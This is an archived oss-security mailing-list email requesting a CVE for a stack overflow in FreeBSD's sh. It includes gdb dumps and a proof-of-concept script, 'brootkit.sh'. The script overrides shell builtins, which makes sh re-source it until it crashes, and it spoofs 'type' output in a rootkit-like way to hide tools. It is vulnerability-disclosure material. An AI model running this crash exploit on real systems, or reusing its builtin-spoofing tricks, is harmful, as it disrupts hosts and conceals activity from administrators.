X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6296" "Tuesday" "31" "March" "2015" "18:42:01" "+0800" "wzt wzt" "wzt.wzt@gmail.com" "<CAEQi4beSswmoiqOsGHDH8U6rqWDXtyNgHnMmKrYsh+PhZ9PxMw@mail.gmail.com>" "201" "[oss-security] CVE request: freebsd/sh stack overflow vulnerability" nil nil nil "3" "2015033110:42:01" "[oss-security] CVE request: freebsd/sh stack overflow vulnerability" (number mark "        wzt.wzt@gmai Mar 31  201/6296  " thread-indent "\"[oss-security] CVE request: freebsd/sh stack overflow vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 22043 invoked by uid 550); 31 Mar 2015 11:11:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3788 invoked from network); 31 Mar 2015 10:42:13 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=eXBUCabw5U5bQXG/aX+CMlmtkbQo49rj56eEyeNNY0M=;
        b=q6wKgslr5CNfZJ592Xjd2X0oiydIeRE+JyhKur3mGGcNjE0nEFp2jAFVp2J+dYCBKg
         DAfKOKi+8pMt7sfKSReT+Y9OdRCBzUVZLKLd6iArQHiqSqZWgS66gd7BSlHEapTOl27I
         Z3ZNipI6OmGYf6jjxV/lueaHkFn1r4p4HuzNTzj+6HGkxISGC0xDs+s98GkRieB6PeX8
         KFzfaIU5jJ+EEuMKtMLugqJJBfdSrDGnlf4IdCM6eOZJFuN8HZm18CpxV3/KyRs2Fi82
         mRYoionJUz2pSr77veEEy3ylANzDxRWas8ywcrmW2b05JBGSFDmNDIPT9xCzey4BG9jV
         wfMw==
MIME-Version: 1.0
X-Received: by 10.112.137.164 with SMTP id qj4mr30258585lbb.17.1427798521964;
 Tue, 31 Mar 2015 03:42:01 -0700 (PDT)
Message-ID: <CAEQi4beSswmoiqOsGHDH8U6rqWDXtyNgHnMmKrYsh+PhZ9PxMw@mail.gmail.com>
Content-Type: multipart/alternative; boundary=089e0115fd1cb66cfd0512933f8b
Date: Tue, 31 Mar 2015 18:42:01 +0800
From: wzt wzt <wzt.wzt@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE request: freebsd/sh stack overflow vulnerability
To: oss-security@lists.openwall.com

--089e0115fd1cb66cfd0512933f8b
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

hi=EF=BC=9A
    I found sh have a stack overflow bug on freebsd(9.0-10.0),  it may be
triggered on all freebsd systems, but i have not tested yet. the poc below
is tested on freebsd10.0 amd64 arch:

$ ls
brootkit.sh
$ . brootkit.sh
$ command
$ ls
brootkit.sh     sh.core

(gdb) x/16x $rsp+0x1b8
0x7fffdfffeff8: Cannot access memory at address 0x7fffdfffeff8
(gdb) x/16x $rsp+0x1c0
0x7fffdffff000: 0x0000000000000000      0x0000000000000000
0x7fffdffff010: 0x0000000000000000      0x0000000000000000
0x7fffdffff020: 0x0000000000000000      0x0000000000000000
0x7fffdffff030: 0x0000000000000000      0x0000000000000000
0x7fffdffff040: 0x0000000000000000      0x0000000000000000
0x7fffdffff050: 0x0000000000000000      0x0000000000000000
0x7fffdffff060: 0x0000000000000000      0x0000000000000000
0x7fffdffff070: 0x0000000000000000      0x0000000000000000

(gdb) disass malloc malloc+32
Dump of assembler code from 0x800d593f0 to 0x800d59410:
0x0000000800d593f0 <malloc+0>:  push   %rbp
0x0000000800d593f1 <malloc+1>:  mov    %rsp,%rbp
0x0000000800d593f4 <malloc+4>:  push   %r15
0x0000000800d593f6 <malloc+6>:  push   %r14
0x0000000800d593f8 <malloc+8>:  push   %r13
0x0000000800d593fa <malloc+10>: push   %r12
0x0000000800d593fc <malloc+12>: push   %rbx
0x0000000800d593fd <malloc+13>: sub    $0x488,%rsp
0x0000000800d59404 <malloc+20>: mov    %rdi,-0x4a0(%rbp)
0x0000000800d5940b <malloc+27>: mov    0x2c2dbe(%rip),%rax        #
0x80101c1d0 <__nsdefaultsrc+4928>


set $i=3D0
set $addr=3D$rbp
while ($i <=3D 1000)
printf "frame[%d] 0x%lx =3D=3D> 0x%lx retaddr: 0x%lx\t diass: ", $i, $addr,
*(long *)$addr, *(long *)($addr+8)
x/i  *(long *)($addr+8)
set $i=3D$i+1
set $addr=3D*(long *)$addr
end

frame[98] 0x7fffe0004c00 =3D=3D> 0x7fffe0004d60 retaddr: 0x406465    diass:
0x406465 <execve@plt+14073>:    incq   0x21d694(%rip)        # 0x623b00
<environ+64>
frame[99] 0x7fffe0004d60 =3D=3D> 0x7fffe0004e10 retaddr: 0x40513b    diass:
0x40513b <execve@plt+9167>:     mov    -0x74(%rbp),%r14d
frame[100] 0x7fffe0004e10 =3D=3D> 0x7fffe0004ec0 retaddr: 0x405118   diass:
0x405118 <execve@plt+9132>:     cmpl   $0x0,0x21e9f5(%rip)        #
0x623b14 <environ+84>

poc:

#!/bin/sh

BR_ROOTKIT_PATH=3D"."

builtin()
{
        local fake_a

        unset command
        case $1 in
                "set"|"unset"|"command"|"type")
                        fake_a=3D"$(command builtin $1 $2)"
                        br_hide_engine "$fake_a"
                        reset_command
                        return ;;
                "builtin")
                        echo "sh: builtin: builtin: syntax error, sh is not
support."
                        reset_command
                        return ;;
                *)
                        command builtin $1 $2
                        reset_command
                        ;;
        esac
}

type()
{
        case $1 in
                "builtin"|"set"|"unset"|"type")
                        echo "$1 is a shell builtin"
                        return ;;
                "dir")
                        echo "dir is /usr/bin/dir"
                        return ;;
                "ls")
                        echo "ls is aliased to ls --color=3Dtty"
                        return ;;
                "ps")
                        echo "ps is /bin/ps"
                        return ;;
                "netstat")
                        echo "netstat is hashed (/usr/bin/netstat)"
                        return ;;
                "/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/usr/bin/netstat")
                        echo "$1 is $1"
                        return ;;
                *)
                        unset command
                        command type $1 $2
                        reset_command
                        return ;;
        esac
}

fake_unset()
{
        case $1 in
                "builtin"|"command"|"set"|"unset"|"type")
                        echo "sh: syntax error, sh is not support."
                        return ;;
                *)
                        unset $1 $2
                        return ;;
        esac
}

fake_command()
{
        case $1 in
                "builtin"|"command"|"set"|"unset"|"type")
                        echo "sh: syntax error, sh is not support."
                        return ;;
                *)
                        unset command
                        command $1 $2
                        reset_command
                        return ;;
        esac
}

command()
{
        case $1 in
                "builtin")
                        builtin $2 $3
                        return ;;
                "unset")
                        fake_unset $2 $3
                        . $BR_ROOTKIT_PATH/brootkit.sh
                        return ;;
                "type")
                        type $2 $3
                        return ;;
                "command")
                        fake_command $2 $3
                        return ;;
                *)
                        unset command
                        command $2 $3
                        . $BR_ROOTKIT_PATH/brootkit.sh
                        return ;;
        esac
}

reset_command()
{
        command()
        {
                case $1 in
                        "builtin")
                                builtin $2 $3
                                return ;;
                        "set")
                                set $2 $3
                                return ;;
                        "unset")
                                fake_unset $2 $3
                                . $BR_ROOTKIT_PATH/brootkit.sh
                                return ;;
                        "type")
                                type $2 $3
                                return ;;
                        "command")
                                fake_command $2 $3
                                return ;;
                        *)
                                unset command
                                command $2 $3
                                . $BR_ROOTKIT_PATH/brootkit.sh
                                return ;;
                esac
        }
}

--089e0115fd1cb66cfd0512933f8b--
